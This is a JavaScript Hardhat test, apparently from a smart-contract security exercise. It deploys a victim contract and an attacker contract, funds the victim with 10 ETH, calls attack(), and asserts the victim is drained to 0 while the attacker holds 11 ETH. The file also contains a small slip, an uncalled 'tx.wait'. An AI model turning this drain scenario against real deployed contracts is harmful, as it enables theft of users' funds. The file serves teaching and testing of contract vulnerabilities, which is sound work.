
const { expect, assert } = require("chai");
const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");
const hre = require("hardhat");


describe("Perfom attack", function () {
  it("drain the funds of a contract", async function () {
    const goodContract = await ethers.getContractFactory("GoodContract");

    const goodContractDeployed = await goodContract.deploy();
    await goodContractDeployed.deployed();

    const badContract = await ethers.getContractFactory("BadContract");

    const badContractDeployed = await badContract.deploy(goodContractDeployed.address);
    await badContractDeployed.deployed();

    const [_, innocentAddress, attackerAddress] = await ethers.getSigners();
    let tx = await goodContractDeployed.connect(innocentAddress).addBalance({value: ethers.utils.parseEther('10')});
    await tx.wait;

    let balanceContract = await ethers.provider.getBalance(goodContractDeployed.address);
    expect(balanceContract).to.equal(ethers.utils.parseEther("10"));

    tx = await badContractDeployed.connect(attackerAddress).attack({value: ethers.utils.parseEther('1')});

    await tx.wait();

    balanceContract = await ethers.provider.getBalance(goodContractDeployed.address);
    expect(balanceContract).to.equal(ethers.utils.parseEther("0"));

    balanceContract = await ethers.provider.getBalance(badContractDeployed.address);
    expect(balanceContract).to.equal(ethers.utils.parseEther("11"));
  });
});
